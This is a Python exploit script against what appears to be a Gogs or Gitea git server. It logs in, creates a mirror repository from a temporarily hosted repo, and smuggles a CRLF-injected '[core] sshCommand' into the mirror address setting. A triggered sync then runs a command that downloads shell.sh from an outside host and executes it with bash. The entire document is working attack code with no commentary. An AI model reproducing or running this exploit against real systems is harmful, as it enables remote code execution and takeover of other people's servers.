#!/usr/bin/python3

import re
import os
import sys
import random
import string
import requests
import tempfile
import threading
import http.server
import socketserver
import urllib.parse
from functools import partial

USERNAME = "test"
PASSWORD = "Password"
HOST_ADDR = '192.168.49.143'
HOST_PORT = 3000
URL = 'http://192.168.143.67:3000'
CMD = 'wget http://192.168.49.143:81/shell.sh && bash shell.sh'
# Login
s = requests.Session()
print(s)
print('Logging in')
body = {
    'user_name': USERNAME,
    'password': PASSWORD
}
r = s.post(URL + '/user/login',data=body)
if r.status_code != 200:
    print('Login unsuccessful')

    sys.exit(1)
print('Logged in successfully')

# Obtain user ID for future requests
print('Retrieving user ID')
r = s.get(URL + '/')
if r.status_code != 200:
    print('Could not retrieve user ID')
    sys.exit(1)

m = re.compile("<meta name=\"_uid\" content=\"(.+)\" />").search(r.text)
USER_ID = m.group(1)
print('Retrieved user ID: {}'.format(USER_ID))

# Hosting the repository to clone
gitTemp = tempfile.mkdtemp()
os.system('cd {} && git init'.format(gitTemp))
os.system('cd {} && git config user.email x@x.com && git config user.name x && touch x && git add x && git commit -m x'.format(gitTemp))
os.system('git clone --bare {} {}.git'.format(gitTemp, gitTemp))
os.system('cd {}.git && git update-server-info'.format(gitTemp))
handler = partial(http.server.SimpleHTTPRequestHandler,directory='/tmp')
socketserver.TCPServer.allow_reuse_address = True
httpd = socketserver.TCPServer(("", HOST_PORT), handler)
t = threading.Thread(target=httpd.serve_forever)
t.start()
print('Created temporary git server to host {}.git'.format(gitTemp))

# Create the repository
print('Creating repository')
REPO_NAME = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
body = {
    '_csrf': urllib.parse.unquote(s.cookies.get('_csrf')),
    'uid': USER_ID,
    'repo_name': REPO_NAME,
    'clone_addr': 'http://{}:{}/{}.git'.format(HOST_ADDR, HOST_PORT, gitTemp[5:]),
    'mirror': 'on'
}
r = s.post(URL + '/repo/migrate', data=body)
if r.status_code != 200:
    print('Error creating repo')
    httpd.shutdown()
    t.join()
    sys.exit(1)
print('Repo "{}" created'.format(REPO_NAME))

# Inject command into config file
print('Injecting command into repo')
body = {
    '_csrf': urllib.parse.unquote(s.cookies.get('_csrf')),
    'mirror_address': 'ssh://example.com/x/x"""\r\n[core]\r\nsshCommand="{}"\r\na="""'.format(CMD),
    'action': 'mirror',
    'enable_prune': 'on',
    'interval': '8h0m0s'
}
r = s.post(URL + '/' + USERNAME + '/' + REPO_NAME + '/settings', data=body)
if r.status_code != 200:
    print('Error injecting command')
    httpd.shutdown()
    t.join()
    sys.exit(1)
print('Command injected')

# Trigger the command
print('Triggering command')
body = {
    '_csrf': urllib.parse.unquote(s.cookies.get('_csrf')),
    'action': 'mirror-sync'
}
r = s.post(URL + '/' + USERNAME + '/' + REPO_NAME + '/settings', data=body)
if r.status_code != 200:
    print('Error triggering command')
    httpd.shutdown()
    t.join()
    sys.exit(1)

print('Command triggered')

# Shutdown the git server
httpd.shutdown()
